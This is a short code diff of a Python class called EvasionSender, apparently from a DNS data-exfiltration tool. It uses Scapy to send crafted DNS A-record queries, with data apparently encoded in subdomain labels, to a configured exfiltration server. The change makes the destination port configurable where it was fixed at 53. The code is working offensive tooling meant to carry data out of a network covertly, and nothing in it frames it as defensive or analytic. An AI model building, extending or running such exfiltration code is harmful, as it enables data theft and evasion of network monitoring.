@@ -120,7 +120,8 @@ class EvasionSender:
         """Craft and send a single DNS A-record query using Scapy.
 
         Packet structure:
-        IP(dst=dns_server) / UDP(sport=src_port, dport=53) / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
+        IP(dst=dns_server) / UDP(sport=src_port, dport=dns_server_port) /
+        DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
 
         Uses send(verbose=0). Returns True on success, False on exception.
         Failures are logged at WARNING level.
@@ -133,7 +134,7 @@ class EvasionSender:
         """
         packet = (
             IP(dst=self.exfil_config.dns_server)
-            / UDP(sport=self.exfil_config.src_port, dport=53)
+            / UDP(sport=self.exfil_config.src_port, dport=self.exfil_config.dns_server_port)
             / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
         )
         try:
@@ -188,7 +189,6 @@ class EvasionSender:
         start = time.monotonic()
 
         for i, fqdn in enumerate(fqdns):
-            # Extract and optionally pad the subdomain label.
             label = fqdn.split(".")[0]
             if label != "done":
                 label_parts = label.split("_", 2)
